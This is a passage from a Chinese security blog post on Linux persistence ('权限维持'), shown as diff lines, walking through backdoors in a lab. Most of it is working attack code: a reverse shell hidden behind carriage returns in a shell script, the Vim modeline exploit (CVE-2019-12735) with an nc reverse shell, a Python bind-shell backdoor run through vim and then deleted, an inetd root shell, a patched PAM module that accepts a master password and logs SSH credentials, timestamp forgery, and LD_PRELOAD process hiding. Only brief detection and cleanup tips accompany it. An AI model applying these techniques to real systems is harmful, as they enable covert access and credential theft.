+ f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/JfWn132UpmCgTNq.png" alt="9.png"></p>
+<p>把其中的一个命令改成反弹shell试一下</p>
+<pre class=" language-php"><code class="language-php">cmd_h <span class="token operator">=</span> <span class="token string">"bash -i >&amp; /dev/tcp/192.168.20.17/9090 0>&amp;1"</span> <span class="token shell-comment comment"># hidden</span>
+cmd_v <span class="token operator">=</span> <span class="token string">"echo 'Hello world!'"</span>                         <span class="token shell-comment comment"># visible</span>
+
+with <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"shell.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+ output <span class="token operator">=</span> <span class="token string">"#!/bin/sh\n"</span>
+ output <span class="token operator">+</span><span class="token operator">=</span> cmd_h <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" #\r"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
+ f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/kgAomDjiEd1ZOQL.png" alt="11.png"></p>
+<p><img src="https://i.loli.net/2021/09/23/zapuCg4ZXBQlJxf.png" alt="10.png"></p>
+<h2 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h2><p>文本编辑器Vim/Neovim任意代码执行漏洞（CVE-2019-12735）</p>
+<p><strong>受影响版本：</strong></p>
+<p><code>Vim &lt; 8.1.1365, Neovim &lt; 0.3.6</code></p>
+<p><strong>开启modeline</strong></p>
+<p>在你的home下的.vimrc文件中增加一行：</p>
+<pre><code>set modeline</code></pre>
+<p>创建文件</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">':!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'</span> <span class="token operator">></span> hello<span class="token punctuation">.</span>txt
+vim hello<span class="token punctuation">.</span>txt</code></pre>
+<p>反弹shell</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">:</span><span class="token operator">!</span>rm <span class="token operator">/</span>tmp<span class="token operator">/</span>f<span class="token punctuation">;</span>mkfifo <span class="token operator">/</span>tmp<span class="token operator">/</span>f<span class="token punctuation">;</span>cat <span class="token operator">/</span>tmp<span class="token operator">/</span>f<span class="token operator">|</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token operator">-</span>i <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">|</span>nc <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token number">9999</span> <span class="token operator">></span><span class="token operator">/</span>tmp<span class="token operator">/</span>f<span class="token operator">||</span><span class="token string">" vi:fen:fdm=expr:fde=assert_fails("</span>source\<span class="token operator">!</span>\ \<span class="token operator">%</span><span class="token string">"):fdl=0:fdt="</span></code></pre>
+<p><strong>vim+python文件后门</strong></p>
+<p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。我这个靶机系统上面是<code>python2.7</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#from https:</span><span class="token comment" spellcheck="true">//www.leavesongs.com/PYTHON/python-shell-backdoor.html</span>
+from socket import <span class="token operator">*</span>
+import subprocess
+import os<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> time
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+       server<span class="token operator">=</span><span class="token function">socket</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span><span class="token constant">SOCK_STREAM</span><span class="token punctuation">)</span>
+       server<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+       server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+       <span class="token keyword">print</span> <span class="token string">'waiting for connect'</span>
+       talk<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+       <span class="token keyword">print</span> <span class="token string">'connect from'</span><span class="token punctuation">,</span>addr
+       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span><span class="token function">Popen</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>talk<span class="token punctuation">,</span>
+               stdout<span class="token operator">=</span>talk<span class="token punctuation">,</span> stderr<span class="token operator">=</span>talk<span class="token punctuation">,</span> shell<span class="token operator">=</span>True<span class="token punctuation">)</span></code></pre>
+<p>脚本完成上传之后执行命令</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span>nohup vim <span class="token operator">-</span>E <span class="token operator">-</span>c <span class="token string">"pyfile dir.py"</span><span class="token operator">></span> <span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">&amp;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> sleep <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> rm <span class="token operator">-</span>f dir<span class="token punctuation">.</span>py   <span class="token comment" spellcheck="true">//因为是隐藏后门，进程和后门直接都隐藏或者删掉</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/vlDWCijIKJsS3w5.png" alt="12.png"></p>
+<p>攻击机直接nc连接</p>
+<pre class=" language-php"><code class="language-php">nc <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token number">11</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/oE1vU6Gmzjla2yM.png" alt="13.png"></p>
+<h2 id="inetd服务后门"><a href="#inetd服务后门" class="headerlink" title="inetd服务后门"></a>inetd服务后门</h2><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门</p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#修改/etc/inetd.conf</span>
+<span class="token variable">$vim</span> <span class="token operator">/</span>etc<span class="token operator">/</span>inetd<span class="token punctuation">.</span>conf
+
+<span class="token shell-comment comment">#discard stream tcp nowait root internal</span>
+<span class="token shell-comment comment">#discard dgram udp wait root internal</span>
+daytime stream tcp nowait root <span class="token operator">/</span>bin<span class="token operator">/</span>bash bash <span class="token operator">-</span>i
+
+<span class="token shell-comment comment">#开启inetd</span>
+inetd
+
+<span class="token shell-comment comment">#nc连接</span>
+nc <span class="token operator">-</span>vv <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.33</span> <span class="token number">13</span></code></pre>
+<h2 id="ICMP后门"><a href="#ICMP后门" class="headerlink" title="ICMP后门"></a>ICMP后门</h2><p>主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/41154036">https://zhuanlan.zhihu.com/p/41154036</a></p>
+<p>开源工具：ICMP后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p>
+<p>这里我用了两台虚拟机，但是没有复现成功，它们之间也是可以通信的</p>
+<pre class=" language-php"><code class="language-php">python2 sendPacket<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.17</span> p4ssw0rd <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.33</span> <span class="token number">6666</span>          <span class="token comment" spellcheck="true">//靶机</span>
+nc <span class="token operator">-</span>lvvp <span class="token number">6666</span>                                                        <span class="token comment" spellcheck="true">//主控端</span></code></pre>
+<h2 id="DNS后门"><a href="#DNS后门" class="headerlink" title="DNS后门"></a>DNS后门</h2><p>在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：通过DNS传输后门来绕过杀软</p>
+<p>开源工具：DNS后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p>
+<p>协议后门检测：对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接</p>
+<p>清除：kill进程、删除文件即可</p>
+<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于/etc/pam.d)，最后调用认证文件(位于/lib/security)进行安全认证<br>简易利用的PAM后门也是通过修改PAM源码中认证的逻辑来达到权限维持<br>PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open<br>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。</p>
+<p>测试靶机是<strong>centos7</strong>，PAM版本<code>pam-1.1.8-22.el7.x86_64</code>，进到网站<code>http://www.linux-pam.org/library</code>找到对应的版本下载</p>
+<p>下载解压完成之后</p>
+<pre class=" language-php"><code class="language-php">cd modules<span class="token operator">/</span>pam_unix<span class="token operator">/</span>
+vim pam_unix_auth<span class="token punctuation">.</span>c
+<span class="token comment" spellcheck="true">//一</span>
+<span class="token comment" spellcheck="true">/* verify the password of this user */</span> 
+retval <span class="token operator">=</span> <span class="token function">_unix_verify_password</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> name<span class="token punctuation">,</span> p<span class="token punctuation">,</span> ctrl<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"z"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;return PAM_SUCCESS;&amp;#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>retval <span class="token operator">==</span> <span class="token constant">PAM_SUCCESS</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+     <span class="token constant">FILE</span> <span class="token operator">*</span> fp<span class="token punctuation">;</span>
+     fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/.sshlog"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s : %s\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token comment" spellcheck="true">//继续操作</span>
+cd <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">.</span><span class="token operator">/</span>configure
+make</code></pre>
+<p><strong>复制新PAM模块到/lib64/security/目录下：</strong></p>
+<p>因为 <code>pam</code> 后门是替换文件，所以查看文件的修改时间，如果为最近的时间就是被替换了。</p>
+<pre class=" language-php"><code class="language-php">stat <span class="token operator">/</span>lib<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so      <span class="token shell-comment comment">#32位</span>
+stat <span class="token operator">/</span>lib64<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so    <span class="token shell-comment comment">#64位</span></code></pre>
+<pre class=" language-php"><code class="language-php">cp <span class="token operator">/</span>root<span class="token operator">/</span>Linux<span class="token operator">-</span><span class="token constant">PAM</span><span class="token number">-1.1</span><span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">/</span>modules<span class="token operator">/</span>pam_unix<span class="token operator">/</span><span class="token punctuation">.</span>libs<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so <span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>security<span class="token operator">/</span>      <span class="token comment" spellcheck="true">//最好是将原先的PAM进行备份</span></code></pre>
+<p>既然可以查看文件创建的时间，那么我们就可以使用<code>touch -r </code>伪造创建时间</p>
+<p>进行到这里，正常的话就是远程<code>ssh</code>时用户名跟密码都会被记录下来</p>
+<p>但这里在复现的时候总是远程<code>ssh</code>连接不成功，卡了好长时间，原因时<strong>setenforce 0</strong>，没有临时关闭之前替换之后总是连接不成功。</p>
+<p>连接成功后查看<code>/tmp/.sshlog</code></p>
+<p><img src="https://i.loli.net/2021/09/25/rkuUlxs74X9d2o1.png" alt="14.png"></p>
+<p>如果想清除后门：<code>yum reinstall pam</code></p>
+<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有 ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace 系统调用允许一个进程去调试另外一个进程。</p>
+<p>GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span>inject <span class="token punctuation">[</span><span class="token operator">-</span>n process<span class="token operator">-</span>name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>p pid<span class="token punctuation">]</span> <span class="token punctuation">[</span>library<span class="token operator">-</span>to<span class="token operator">-</span>inject<span class="token punctuation">]</span>
+<span class="token punctuation">.</span><span class="token operator">/</span>inject <span class="token operator">-</span>n sample<span class="token operator">-</span>target sample<span class="token operator">-</span>library<span class="token punctuation">.</span>so</code></pre>
+<p>清除：kill或者重启对应的进程即可</p>
+<p>还有 cymothoa ：<a target="_blank" rel="noopener" href="https://github.com/jorik041/cymothoa">https://github.com/jorik041/cymothoa</a></p>
+<p><strong>libprocesshider</strong></p>
+<p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p>
+<p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 下载程序编译</span>
+git clone https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/gianlucaborello/libprocesshider.git</span>
+cd libprocesshider<span class="token operator">/</span> <span class="token operator">&amp;&amp;</span> make
+<span class="token shell-comment comment"># 移动文件到/usr/local/lib/目录下</span>
+cp libprocesshider<span class="token punctuation">.</span>so <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>
+<span class="token shell-comment comment"># 把它加载到全局动态连接局</span>
+<span class="token keyword">echo</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>libprocesshider<span class="token punctuation">.</span>so <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>etc<span class="token operator">/</span>ld<span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload
+<span class="token shell-comment comment">#运行</span>
+<span class="token punctuation">.</span><span class="token operator">/</span>evil_script<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.33</span> <span class="token number">3333</span></code></pre>
+<h2 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h2><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p>
+<p>Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件</p>
+<p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 安装</span>
+sudo yum install unhide
+<span class="token shell-comment comment"># 使用</span>
+unhide <span class="token punctuation">[</span>options<span class="token punctuation">]</span> test_list</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://blog.csdn.net/weixin_40412037/article/details/119379149</code></p>
+<p><code>https://mp.weixin.qq.com/s/JQ0lMRHJxw72lNK3XJGNSg</code></p>
+<p><code>https://blog.csdn.net/qq_17204441/article/details/106914027</code></p>
+<p><code>https://www.anquanke.com/post/id/83423</code></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">PlayZG</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/09/28/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">http://example.com/2021/09/28/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">PlayZG</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/09/28/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Linux权限维持">
+                        
+                        <span class="card-title">Linux权限维持</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/09/20/Metasploit%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Metasploit (MSF)入门学习">
+                        
+                        <span class="card-title">Metasploit (MSF)入门学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Metasploit/">
+                        <span class="chip bg-color">Metasploit</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: PlayZG<br />'
+            + '文章作者: John Doe<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
